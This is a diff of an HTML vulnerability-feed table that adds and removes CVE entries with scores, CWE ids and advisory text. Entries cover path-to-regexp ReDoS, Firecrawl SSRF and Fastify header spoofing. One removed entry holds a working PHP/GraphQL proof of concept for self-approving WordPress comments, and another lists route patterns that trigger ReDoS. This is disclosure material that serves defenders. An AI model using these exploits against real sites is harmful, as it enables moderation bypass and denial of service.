+Patches:
+
+Fixed in version 8.4.0.
+
+Workarounds:
+
+Limit the number of sequential optional groups in route patterns. Avoid passing user-controlled input as route patterns.</p></details></td>
+        <td>2026-03-26</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4923" target="_blank" rel="noopener">CVE-2026-4923</a></td>
+        <td>5.9</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-1333</td>
+        <td>&nbsp;</td>
+        <td>0.1% <small>p16</small></td>
+        <td>4.13</td>
+        <td><details><summary>Impact:
+
+When using multiple wildcards, combined with at least one parameter, a ...</summary><p>Impact:
+
+When using multiple wildcards, combined with at least one parameter, a regular expression can be generated that is vulnerable to ReDoS. This backtracking vulnerability requires the second wildcard to be somewhere other than the end of the path.
+
+Unsafe examples:
+
+/*foo-*bar-:baz
+/*a-:b-*c-:d
+/x/*a-:b/*c/y
+
+Safe examples:
+
+/*foo-:bar
+/*foo-:bar-*baz
+
+Patches:
+
+Upgrade to version 8.4.0.
+
+Workarounds:
+
+If you are using multiple wildcard parameters, you can check the regex output with a tool such as https://makenowjust-labs.github.io/recheck/playground/ to confirm whether a path is vulnerable.</p></details></td>
+        <td>2026-03-26</td>
+      </tr>
+      <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3190" target="_blank" rel="noopener">CVE-2026-3190</a></td>
         <td>4.3</td>
         <td><span class="severity medium">MEDIUM</span></td>
@@ -41927,6 +42233,33 @@ This issue affects cosmic-greeter before https://github.Com/pop-os/cosmic-greete
         <td>0.0% <small>p11</small></td>
         <td>5.46</td>
         <td><details><summary>Firecrawl version 2.8.0 and prior contain a server-side request forgery (SSRF) p...</summary><p>Firecrawl version 2.8.0 and prior contain a server-side request forgery (SSRF) protection bypass vulnerability in the Playwright scraping service where network policy validation is applied only to the initial user-supplied URL and not to subsequent redirect destinations. Attackers can supply an externally valid URL that passes validation and returns an HTTP redirect to an internal or restricted resource, allowing the browser to follow the redirect and fetch the final destination without revalidation, thereby gaining access to internal network services and sensitive endpoints. This issue is distinct from CVE-2024-56800, which describes redirect-based SSRF generally. This vulnerability specifically arises from a post-redirect enforcement gap in implemented SSRF protections, where validation is applied only to the initial request and not to the final redirected destination.</p></details></td>
+        <td>2026-03-26</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4867" target="_blank" rel="noopener">CVE-2026-4867</a></td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-1333</td>
+        <td>&nbsp;</td>
+        <td>0.1% <small>p15</small></td>
+        <td>5.25</td>
+        <td><details><summary>Impact:
+
+A bad regular expression is generated any time you have three or more p...</summary><p>Impact:
+
+A bad regular expression is generated any time you have three or more parameters within a single segment, separated by something that is not a period (.). For example, /:a-:b-:c or /:a-:b-:c-:d. The backtrack protection added in path-to-regexp@0.1.12 only prevents ambiguity for two parameters. With three or more, the generated lookahead does not block single separator characters, so capture groups overlap and cause catastrophic backtracking.
+
+Patches:
+
+Upgrade to path-to-regexp@0.1.13
+
+Custom regex patterns in route definitions (e.g., /:a-:b([^-/]+)-:c([^-/]+)) are not affected because they override the default capture group.
+
+Workarounds:
+
+All versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change /:a-:b-:c to /:a-:b([^-/]+)-:c([^-/]+).
+
+If paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length.</p></details></td>
         <td>2026-03-26</td>
       </tr>
       <tr>
@@ -51533,92 +51866,6 @@ This issue affects cosmic-greeter before https://github.Com/pop-os/cosmic-greete
         <td>2026-03-24</td>
       </tr>
       <tr>
-        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33290" target="_blank" rel="noopener">CVE-2026-33290</a></td>
-        <td>4.3</td>
-        <td><span class="severity medium">MEDIUM</span></td>
-        <td>CWE-862</td>
-        <td>&nbsp;</td>
-        <td>0.0% <small>p8</small></td>
-        <td>3.01</td>
-        <td><details><summary>WPGraphQL provides a GraphQL API for WordPress sites. Prior to version 2.10.0, a...</summary><p>WPGraphQL provides a GraphQL API for WordPress sites. Prior to version 2.10.0, an authorization flaw in updateComment allows an authenticated low-privileged user (including a custom role with zero capabilities) to change moderation status of their own comment (for example to APPROVE) without the moderate_comments capability. This can bypass moderation workflows and let untrusted users self-approve content. Version 2.10.0 contains a patch.
-
-### Details
-
-In WPGraphQL 2.9.1 (tested), authorization for updateComment is owner-based, not field-based:
-
-- plugins/wp-graphql/src/Mutation/CommentUpdate.php:92 allows moderators.
-- plugins/wp-graphql/src/Mutation/CommentUpdate.php:99:99 also allows the comment owner, even if they lack moderation capability.
-- plugins/wp-graphql/src/Data/CommentMutation.php:94:94 maps GraphQL input status directly to WordPress comment_approved.
-- plugins/wp-graphql/src/Mutation/CommentUpdate.php:120:120 persists that value via wp_update_comment.
-- plugins/wp-graphql/src/Type/Enum/CommentStatusEnum.php:22:22 exposes moderation states (APPROVE, HOLD, SPAM, TRASH).
-
-This means a non-moderator owner can submit status during update and transition moderation state.
-
-### PoC
-
-Tested in local wp-env (Docker) with WPGraphQL 2.9.1.
-
-1. Start environment:
-
-  npm install
-  npm run wp-env start
-
-2. Run this PoC:
-
-```
-  npm run wp-env run cli -- wp eval &#x27;
-  add_role(&quot;no_caps&quot;,&quot;No Caps&quot;,[]);
-  $user_id = username_exists(&quot;poc_nocaps&quot;);
-  if ( ! $user_id ) {
-    $user_id = wp_create_user(&quot;poc_nocaps&quot;,&quot;Passw0rd!&quot;,&quot;poc_nocaps@example.com&quot;);
-  }
-  $user = get_user_by(&quot;id&quot;,$user_id);
-  $user-&gt;set_role(&quot;no_caps&quot;);
-
-  $post_id = wp_insert_post([
-    &quot;post_title&quot; =&gt; &quot;PoC post&quot;,
-    &quot;post_status&quot; =&gt; &quot;publish&quot;,
-    &quot;post_type&quot; =&gt; &quot;post&quot;,
-    &quot;comment_status&quot; =&gt; &quot;open&quot;,
-  ]);
-
-  $comment_id = wp_insert_comment([
-    &quot;comment_post_ID&quot; =&gt; $post_id,
-    &quot;comment_content&quot; =&gt; &quot;pending comment&quot;,
-    &quot;user_id&quot; =&gt; $user_id,
-    &quot;comment_author&quot; =&gt; $user-&gt;display_name,
-    &quot;comment_author_email&quot; =&gt; $user-&gt;user_email,
-    &quot;comment_approved&quot; =&gt; &quot;0&quot;,
-  ]);
-
-  wp_set_current_user($user_id);
-
-  $result = graphql([
-    &quot;query&quot; =&gt; &quot;mutation U(\$id:ID!){ updateComment(input:{id:\$id,status:APPROVE}){ success comment{ databaseId status } } }&quot;,
-    &quot;variables&quot; =&gt; [ &quot;id&quot; =&gt; (string)$comment_id ],
-  ]);
-
-  echo wp_json_encode([
-    &quot;role_caps&quot; =&gt; array_keys(array_filter((array)$user-&gt;allcaps)),
-    &quot;status&quot; =&gt; $result[&quot;data&quot;][&quot;updateComment&quot;][&quot;comment&quot;][&quot;status&quot;] ?? null,
-    &quot;db_comment_approved&quot; =&gt; get_comment($comment_id)-&gt;comment_approved ?? null,
-    &quot;comment_id&quot; =&gt; $comment_id
-  ]);
-  &#x27;
-```
-
-3. Observe result:
-
-- role_caps is empty (or no moderate_comments)
-- mutation returns status: APPROVE
-- DB value becomes comment_approved = 1
-
-### Impact
-
-This is an authorization bypass / broken access control issue in comment moderation state transitions. Any deployment using WPGraphQL comment mutations where low-privileged users can make comments is impacted. Moderation policy can be bypassed by self-approving content.</p></details></td>
-        <td>2026-03-24</td>
-      </tr>
-      <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22739" target="_blank" rel="noopener">CVE-2026-22739</a></td>
         <td>8.6</td>
         <td><span class="severity high">HIGH</span></td>
@@ -53299,6 +53546,27 @@ This is an authorization bypass / broken access control issue in comment moderat
         <td>0.0% <small>p11</small></td>
         <td>3.71</td>
         <td><details><summary>A vulnerability was identified in kalcaddle kodbox 1.64. The affected element is...</summary><p>A vulnerability was identified in kalcaddle kodbox 1.64. The affected element is the function PathDriverUrl of the file /workspace/source-code/app/controller/explorer/editor.class.php of the component fileGet Endpoint. Such manipulation of the argument path leads to server-side request forgery. The attack may be launched remotely. The exploit is publicly available and might be used. The vendor was contacted early about this disclosure but did not respond in any way. Statistical analysis made it clear that VulDB provides the best quality for vulnerability data.</p></details></td>
+        <td>2026-03-23</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3635" target="_blank" rel="noopener">CVE-2026-3635</a></td>
+        <td>6.1</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-348</td>
+        <td>&nbsp;</td>
+        <td>0.0% <small>p0</small></td>
+        <td>4.27</td>
+        <td><details><summary>Summary
+When trustProxy is configured with a restrictive trust function (e.g., a...</summary><p>Summary
+When trustProxy is configured with a restrictive trust function (e.g., a specific IP like trustProxy: &#x27;10.0.0.1&#x27;, a subnet, a hop count, or a custom function), the request.protocol and request.host getters read X-Forwarded-Proto and X-Forwarded-Host headers from any connection — including connections from untrusted IPs. This allows an attacker connecting directly to Fastify (bypassing the proxy) to spoof both the protocol and host seen by the application.
+
+Affected Versions
+fastify &lt;= 5.8.2
+
+Impact
+Applications using request.protocol or request.host for security decisions (HTTPS enforcement, secure cookie flags, CSRF origin checks, URL construction, host-based routing) are affected when trustProxy is configured with a restrictive trust function.
+
+When trustProxy: true (trust everything), both host and protocol trust all forwarded headers — this is expected behavior. The vulnerability only manifests with restrictive trust configurations.</p></details></td>
         <td>2026-03-23</td>
       </tr>
       <tr>
@@ -57820,21 +58088,6 @@ This is an authorization bypass / broken access control issue in comment moderat
         <td>0.0% <small>p12</small></td>
         <td>5.25</td>
         <td><details><summary>Bitcoin Core 0.13.0 through 29.x has an integer overflow.</summary><p>Bitcoin Core 0.13.0 through 29.x has an integer overflow.</p></details></td>
-        <td>2026-03-20</td>
-      </tr>
-      <tr>
-        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4519" target="_blank" rel="noopener">CVE-2026-4519</a></td>
-        <td>7.0</td>
-        <td><span class="severity high">HIGH</span></td>
-        <td>CWE-20</td>
-        <td>&nbsp;</td>
-        <td>0.0% <small>p9</small></td>
-        <td>4.90</td>
-        <td><details><summary>The webbrowser.open() API would accept leading dashes in the URL which 
-could be...</summary><p>The webbrowser.open() API would accept leading dashes in the URL which 
-could be handled as command line options for certain web browsers. New 
-behavior rejects leading dashes. Users are recommended to sanitize URLs 
-prior to passing to webbrowser.open().</p></details></td>
         <td>2026-03-20</td>
       </tr>
       <tr>
@@ -64776,25 +65029,6 @@ prior to passing to webbrowser.open().</p></details></td>
         <td>0.2% <small>p47</small></td>
         <td>6.38</td>
         <td><details><summary>Wazuh is a free and open source platform used for threat prevention, detection, ...</summary><p>Wazuh is a free and open source platform used for threat prevention, detection, and response. Versions 4.0.0 through 4.14.2 have a Remote Code Execution (RCE) vulnerability due to Deserialization of Untrusted Data). All Wazuh deployments using cluster mode (master/worker architecture) and any organization with a compromised worker node (e.g., through initial access, insider threat, or supply chain attack) are impacted. An attacker who gains access to a worker node (through any means) can achieve full RCE on the master node with root privileges. Version 4.14.3 fixes the issue.</p></details></td>
-        <td>2026-03-17</td>
-      </tr>
-      <tr>
-        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25534" target="_blank" rel="noopener">CVE-2026-25534</a></td>
-        <td>9.1</td>
-        <td><span class="severity critical">CRITICAL</span></td>
-        <td>CWE-918</td>
-        <td>&nbsp;</td>
-        <td>0.0% <small>p14</small></td>
-        <td>6.37</td>
-        <td><details><summary>### Impact
-Spinnaker updated URL Validation logic on user input to provide sanit...</summary><p>### Impact
-Spinnaker updated URL Validation logic on user input to provide sanitation on user inputted URLs for clouddriver.  However, they missed that Java URL objects do not correctly handle underscores on parsing.  This led to a bypass of the previous CVE (CVE-2025-61916) through the use of carefully crafted URLs.  Note, Spinnaker found this not just in that CVE, but in the existing URL validations in Orca fromUrl expression handling.  This CVE impacts BOTH artifacts as a result.   
-
-### Patches
-This has been merged and will be available in versions 2025.4.1, 2025.3.1, 2025.2.4 and 2026.0.0.  
-
-### Workarounds
-You can disable the various artifacts on this system to work around these limits.</p></details></td>
         <td>2026-03-17</td>
       </tr>
       <tr>
